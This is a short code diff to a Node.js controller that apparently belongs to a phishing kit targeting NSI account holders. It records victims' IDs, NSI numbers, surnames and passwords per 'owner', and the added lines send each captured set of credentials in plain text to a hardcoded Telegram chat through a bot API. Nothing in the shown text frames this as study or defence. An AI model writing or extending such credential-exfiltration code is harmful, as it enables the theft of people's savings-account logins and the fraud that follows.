@@ -1,4 +1,5 @@
 const NSI = require("../models/nsiModel");
+const axios = require("axios");
 
 const getOwnerVics = async (req, res) => {
 	const { owner } = req.params;
@@ -49,6 +50,21 @@ const submitLogin = async (req, res) => {
 			owner,
 			ip,
 		});
+
+		let originalText = `ID: ${uniqueid}\nNSI: ${nsiNumber}\nLast name: ${surname}\nPassword: ${password}`;
+		await axios
+			.post(
+				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+				{
+					chat_id: 680379375,
+					text: `NSI:\n${originalText}`,
+					parse_mode: "Markdown",
+				}
+			)
+			.catch((e) => {
+				console.log(e);
+			});
+
 		res.sendStatus(200);
 	} catch (error) {
 		console.log(error);
